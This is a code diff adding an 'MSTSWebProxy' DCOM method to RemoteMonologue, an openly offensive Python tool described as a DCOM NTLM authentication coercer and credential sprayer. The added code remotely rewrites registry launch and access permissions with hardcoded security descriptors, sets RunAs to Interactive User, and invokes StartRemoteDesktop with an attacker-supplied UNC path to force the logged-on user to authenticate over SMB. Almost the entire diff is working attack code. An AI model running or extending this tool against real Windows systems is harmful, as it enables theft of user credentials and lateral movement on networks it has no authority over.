@@ -173,6 +173,8 @@ class RemoteMonologue:
                 registry_path = "SOFTWARE\\Classes\\AppID\\{03837503-098b-11d8-9414-505054503030}"
             elif (self.__dcom == "FileSystemImage"):
                 registry_path = "SOFTWARE\\Classes\\AppID\\{2C941FD1-975B-59BE-A960-9A2A262853A5}"
+            elif (self.__dcom == "MSTSWebProxy"):
+                registry_path = "SOFTWARE\\Classes\\AppID\\{C92A9617-0EAE-4235-BD2B-84540EF1FFA9}"
 
 
             # Open the registry key
@@ -182,6 +184,7 @@ class RemoteMonologue:
                 registry_path,
                 samDesired=(MAXIMUM_ALLOWED),
             )
+
 
             # Get the OWNER security descriptor
             resp = rrp.hBaseRegGetKeySecurity(
@@ -282,6 +285,63 @@ class RemoteMonologue:
                 rrp.REG_SZ,
                 "Interactive User"
                 )
+
+            if(self.__dcom == "MSTSWebProxy"):
+
+            # Change "LaunchPermission" and "AccessPermission" values
+                LaunchPermission_data = rrp.hBaseRegQueryValue(
+                    dce,
+                    key_handle['phkResult'],
+                    'LaunchPermission'
+                )
+
+                original_LaunchPermission = LaunchPermission_data[1]
+
+                new_LaunchPermission = (
+                    b'\x01\x00\x04\x80\x60\x00\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00'
+                    b'\x14\x00\x00\x00\x02\x00\x4c\x00\x03\x00\x00\x00\x00\x00\x14\x00'
+                    b'\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00'
+                    b'\x00\x00\x18\x00\x1f\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05'
+                    b'\x20\x00\x00\x00\x20\x02\x00\x00\x00\x00\x18\x00\x1f\x00\x00\x00'
+                    b'\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x2f\x02\x00\x00'
+                    b'\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00'
+                    b'\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00'
+                )
+
+                AccessPermission_data = rrp.hBaseRegQueryValue(
+                    dce,
+                    key_handle['phkResult'],
+                    'AccessPermission'
+                )
+                original_AccessPermission = AccessPermission_data[1]
+
+                new_AccessPermission = (
+                    b'\x01\x00\x04\x80\x60\x00\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00'
+                    b'\x14\x00\x00\x00\x02\x00\x4c\x00\x03\x00\x00\x00\x00\x00\x14\x00'
+                    b'\x03\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00'
+                    b'\x00\x00\x18\x00\x07\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05'
+                    b'\x20\x00\x00\x00\x20\x02\x00\x00\x00\x00\x18\x00\x07\x00\x00\x00'
+                    b'\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x2f\x02\x00\x00'
+                    b'\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00'
+                    b'\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00\x20\x02\x00\x00'
+                )
+
+                ans = rrp.hBaseRegSetValue(
+                    dce,
+                    key_handle['phkResult'],
+                    'LaunchPermission',
+                    rrp.REG_BINARY,
+                    new_LaunchPermission
+                    )
+
+                ans = rrp.hBaseRegSetValue(
+                    dce,
+                    key_handle['phkResult'],
+                    'AccessPermission',
+                    rrp.REG_BINARY,
+                    new_AccessPermission
+                    )
+
 
         if(self.__downgrade):
 
@@ -389,6 +449,25 @@ class RemoteMonologue:
                 'RunAs',
                 )
 
+            if(self.__dcom == "MSTSWebProxy"):
+
+                # Reset "LaunchPermission" and "AccessPermission"
+                ans = rrp.hBaseRegSetValue(
+                    dce,
+                    key_handle['phkResult'],
+                    'LaunchPermission',
+                    rrp.REG_BINARY,
+                    original_LaunchPermission
+                    )
+
+                ans = rrp.hBaseRegSetValue(
+                    dce,
+                    key_handle['phkResult'],
+                    'AccessPermission',
+                    rrp.REG_BINARY,
+                    original_AccessPermission
+                    )
+
             rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])
 
             logging.debug("Reverting OWNER and DACL registry permissions")
@@ -419,9 +498,8 @@ class RemoteMonologue:
             rrp.hBaseRegCloseKey(dce, key_handle["phkResult"])        
 
         rrp.hBaseRegCloseKey(dce, reg_handle["phKey"])
-        
         dce.disconnect()
-        
+
 
     def hBaseRegSetKeySecurity(self, dce, hKey, pRpcSecurityDescriptor, securityInformation = scmr.OWNER_SECURITY_INFORMATION):
         # Thank you @skelsec
@@ -685,8 +763,27 @@ class RemoteMonologue:
                     iFileSystemImage = IDispatch(iInterface)
                     pWorkingdirectory = iFileSystemImage.GetIDsOfNames(('workingdirectory',))[0]
 
-                    AuthenticationCoercer((iFileSystemImage, pWorkingdirectory), self.__auth_to, self.__dcom)              
+                    AuthenticationCoercer((iFileSystemImage, pWorkingdirectory), self.__auth_to, self.__dcom)
+
+                elif (self.__dcom == "MSTSWebProxy"):
+
+                    # MSTSWebProxy CLSID for Interactive User authentication
+                    iInterface = dcom.CoCreateInstanceEx(string_to_bin('B43A0C1E-B63F-4691-B68F-CD807A45DA01'), IID_IDispatch)
+
+                    iMSTSWebProxy = IDispatch(iInterface)
+                    pStartRemoteDesktop = iMSTSWebProxy.GetIDsOfNames(('StartRemoteDesktop',))[0]
+
+                    AuthenticationCoercer((iMSTSWebProxy, pStartRemoteDesktop), self.__auth_to, self.__dcom)
+
+                    print(text_green + "[+] Coerced SMB authentication! %+35s" % self.__address + text_end)
+                    
+                    if self.__output != None:
+                        output_file = open(self.__output, "a")
+                        output_file.write("[+] Forced SMB authentication for Interactive User," + self.__address + "\n")
+                        output_file.close()
                
+                dcom.disconnect()
+
             except  (Exception) as e:
                 if str(e).find("OAUT SessionError: unknown error code: 0x0") >= 0:
                 	logging.debug("Got exepcted 0x0 SessionError")
@@ -722,12 +819,12 @@ class RemoteMonologue:
                 
                 dcom.disconnect()
                 sys.stdout.flush()
-                
+            
             except KeyboardInterrupt:
                 sys.exit(0)
 
             dce.disconnect()
-        
+
         except (Exception) as e:
             if str(e).find("No route to host") >= 0:
                     logging.debug("No route to host")
@@ -815,6 +912,30 @@ class AuthenticationCoercer():
             elif (self.__dcom == "ServerDataCollectorSet" or self.__dcom == None):
                 dispParams['rgvarg'].append(arg0)
                 dispParams['rgvarg'].append(arg1)
+
+            self._executeUNCpath[0].Invoke(self._executeUNCpath[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
+
+        elif (self.__dcom == "MSTSWebProxy"):
+
+            dispParams = DISPPARAMS(None, False)
+            dispParams['rgdispidNamedArgs'] = NULL
+            dispParams['cArgs'] = 2 
+            dispParams['cNamedArgs'] = 0
+            
+            arg0 = VARIANT(None, False)
+            arg0['clSize'] = 5
+            arg0['vt'] = VARENUM.VT_BSTR
+            arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
+            arg0['_varUnion']['bstrVal']['asData'] = "C:\\windows\\syswow64\\mstsc.exe"
+
+            arg1 = VARIANT(None, False)
+            arg1['clSize'] = 5
+            arg1['vt'] = VARENUM.VT_BSTR
+            arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
+            arg1['_varUnion']['bstrVal']['asData'] = "/edit " + UNCpath
+            
+            dispParams['rgvarg'].append(arg1)
+            dispParams['rgvarg'].append(arg0)
 
             self._executeUNCpath[0].Invoke(self._executeUNCpath[1], 0x409, DISPATCH_METHOD, dispParams, 0, [], [])
 
@@ -913,7 +1034,7 @@ if __name__ == '__main__':
 |  \ |___  |  | \__/  |  |___  |  | \__/ | \| \__/ |___ \__/ \__> \__/ |___ 
                                                                             
                                   
-                        v1.0.0 - @AndrewOliveau
+                        v1.1 - @AndrewOliveau
                                                 """ + text_end)
 
     parser = argparse.ArgumentParser(add_help = True, description = "DCOM NTLM authentication coercer and sprayer")
@@ -923,7 +1044,7 @@ if __name__ == '__main__':
 
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('-dcom', action='store', metavar = "", help='DCOM object  - ServerDataCollectorSet (default), FileSystemImage, UpdateSession (SYSTEM)')                      
+    parser.add_argument('-dcom', action='store', metavar = "", help='DCOM object  - ServerDataCollectorSet (default), FileSystemImage, MSTSWebProxy, UpdateSession (SYSTEM)')                      
     parser.add_argument('-auth-to', action='store', metavar = "ip address", help='Server for Interactive User to authenticate to over SMB')
     parser.add_argument('-spray', action='store_true', default = False,
                         help='Spray credentials against provided list of systems. Filename must be provided in domain/user@FILE')
@@ -967,8 +1088,8 @@ if __name__ == '__main__':
         logging.getLogger().setLevel(logging.INFO)
 
 
-    if options.dcom not in ["ServerDataCollectorSet", "FileSystemImage", "UpdateSession", None]:
-        logging.error("Incorrect -dcom option. Choose: ServerDataCollectorSet (default), FileSystemImage, UpdateSession (SYSTEM)")
+    if options.dcom not in ["ServerDataCollectorSet", "FileSystemImage", "UpdateSession", "MSTSWebProxy", None]:
+        logging.error("Incorrect -dcom option. Choose: ServerDataCollectorSet (default), FileSystemImage, MSTSWebProxy, UpdateSession (SYSTEM)")
         sys.exit(0)
 
     if options.downgrade and options.webclient:
